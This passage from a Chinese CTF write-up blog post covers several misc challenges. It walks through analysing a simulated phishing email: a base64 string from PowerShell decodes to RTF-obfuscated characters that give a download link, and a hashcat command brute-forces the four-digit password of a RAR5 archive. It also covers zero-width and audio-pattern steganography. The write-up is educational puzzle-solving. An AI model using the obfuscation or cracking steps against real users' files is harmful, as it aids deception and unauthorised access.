+<span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt
+img = cv.imread(<span class="hljs-string">&#x27;1.bmp&#x27;</span>, <span class="hljs-number">0</span>)
+f = np.fft.fft2(img)
+logf = <span class="hljs-number">20</span>*np.log(np.abs(f))
+plt.imshow(logf, <span class="hljs-string">&#x27;gray&#x27;</span>)
+plt.<span class="hljs-keyword">show</span>()</code></pre></div>
+
+<p>但是图片无法看清</p>
+<h3 id="interesting-fishing"><a href="#interesting-fishing" class="headerlink" title="interesting_fishing"></a>interesting_fishing</h3><p>附件拿到注释.txt  和bin文件</p>
+<div class="code-wrapper"><pre><code class="hljs sqf">crazyman_army是某安全公司的研究人员
+这天他的其邮箱里发现了一封奇怪的邮件 
+你能帮助他找到其隐藏的信息吗
+
+注意:
+附件是第一部分的<span class="hljs-built_in">flag</span>
+图片是第二部分的<span class="hljs-built_in">flag</span>
+最后<span class="hljs-built_in">flag</span>为 第一部分+第二部分
+
+<span class="hljs-built_in">hint</span>:powershell解码后的字符可能存在不可读的情况 那并不是解码错误</code></pre></div>
+
+<p>根据提示修改bin文件后缀为eml文件，并用foxmail打开</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024203239673.png" srcset="/img/loading.gif" lazyload alt="image-20231024203239673"></p>
+<p>把rar和图片都保存下来</p>
+<p><code>ThisIsSecret.jpg</code>  猜测outsecret，  无密码解出后半段flag   </p>
+<div class="code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-symbol">_fr0m_l@</span><span class="hljs-symbol">z@</span>RuS&#125;</code></pre></div>
+
+<p>rar在myproject\giveyourflag\giveyourflag\x64\Debug目录下有Browse.VC.db</p>
+<p>但解压下来后不见，</p>
+<p>关闭<img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024203704327.png" srcset="/img/loading.gif" lazyload alt="image-20231024203704327"></p>
+<p>打开</p>
+<div class="code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$encodestring</span> = <span class="hljs-string">&quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;</span>
+<span class="hljs-variable">$bytes</span>  = [<span class="hljs-title class_">System</span>.<span class="hljs-title class_">Convert</span>]::<span class="hljs-title class_">FromBase64String</span>(<span class="hljs-variable">$string</span>);
+<span class="hljs-variable">$decoded</span> = [<span class="hljs-title class_">System</span>.<span class="hljs-title class_">Text</span>.<span class="hljs-title class_">Encoding</span>]::<span class="hljs-title class_">UTF8</span>.<span class="hljs-title class_">GetString</span>(<span class="hljs-variable">$bytes</span>); 
+echo <span class="hljs-variable">$decoded</span></code></pre></div>
+
+<p>解密得到</p>
+<div class="code-wrapper"><pre><code class="hljs subunit">\u<span class="hljs-string">-65432</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65424</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65478</span>?\u<span class="hljs-string">-65489</span>?\u<span class="hljs-string">-65489</span>?\u<span class="hljs-string">-65418</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65437</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65434</span>?\u<span class="hljs-string">-65491</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65485</span>?\u<span class="hljs-string">-65491</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65483</span>?\u<span class="hljs-string">-65481</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65482</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65485</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65437</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65424</span>?\u<span class="hljs-string">-65491</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65430</span>?\u<span class="hljs-string">-65431</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65427</span>?\u<span class="hljs-string">-65415</span>?\u<span class="hljs-string">-65423</span>?\u<span class="hljs-string">-65437</span>?\u<span class="hljs-string">-65428</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65419</span>?\u<span class="hljs-string">-65436</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65437</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65427</span>?\u<span class="hljs-string">-65489</span>?\u<span class="hljs-string">-65456</span>?\u<span class="hljs-string">-65415</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65415</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65435</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65428</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65417</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65434</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65435</span>?\u<span class="hljs-string">-65431</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65436</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65427</span>?\u<span class="hljs-string">-65431</span>?\u<span class="hljs-string">-65436</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65458</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65432</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65461</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65435</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65469</span>?\u<span class="hljs-string">-65457</span>?\u<span class="hljs-string">-65450</span>?\u<span class="hljs-string">-65463</span>?\u<span class="hljs-string">-65468</span>?\u<span class="hljs-string">-65491</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65479</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65424</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65431</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65422</span>?</code></pre></div>
+
+<p>RTF格式，用65536减去之后转ascii</p>
+<p><code>https://vnctf-213-1257061123.cos.ap-nanjing-myqcloud.com/Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar</code></p>
+<p>RTF格式中使用\uN?表示一个unciode字符。\u后跟一个带符号的16位十进制整数值接一个占位符，用？表示。N大于32767的话，则表示为负数。解混淆示例如下：</p>
+<p>L”h” &#x3D;&#x3D; 0x0068 &#x3D;&#x3D; -(-0x0068) &#x3D;&#x3D; -(0xFFFF+1-0x68) &#x3D;&#x3D; -65432&#x3D;\u-65432?是个链接，下载打开看到提示四位数字</p>
+<p>工具爆破 9705   <code>Accent RAR Password Recovery</code></p>
+<p><code>hashcat -m 13000 -a 3 --force &#39;$rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15$ca4a3bc58278b04d9fba4d7d52acb196$8$56245cd11e4a1c2e&#39; &#39;?d?d?d?d&#39;</code></p>
+<p>解压出来word文件</p>
+<p>发现文件是zip文件头</p>
+<p>进入<code>word</code>目录找到，<code>hideinfo.xml</code></p>
+<p>发现是零宽隐写</p>
+<h3 id="Do-you-like-Rhythm-Doctor"><a href="#Do-you-like-Rhythm-Doctor" class="headerlink" title="Do_you_like_Rhythm_Doctor"></a>Do_you_like_Rhythm_Doctor</h3><p>下载节奏医生编辑器</p>
+<p>加载文件，</p>
+<p>左下角调到第二个，发现有8个一组，矩形（square）是零，波形是1</p>
+<p>一行一行读取即可</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>已发生的比赛刷题</div>
+      <div>https://zer0peach.github.io/2023/10/23/已发生的比赛刷题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/30/ACTF2023/" title="ACTF2023">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ACTF2023</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/" title="CNSS夏令营及招新赛">
+                        <span class="hidden-mobile">CNSS夏令营及招新赛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP证123456号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>京公网安备12345678号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
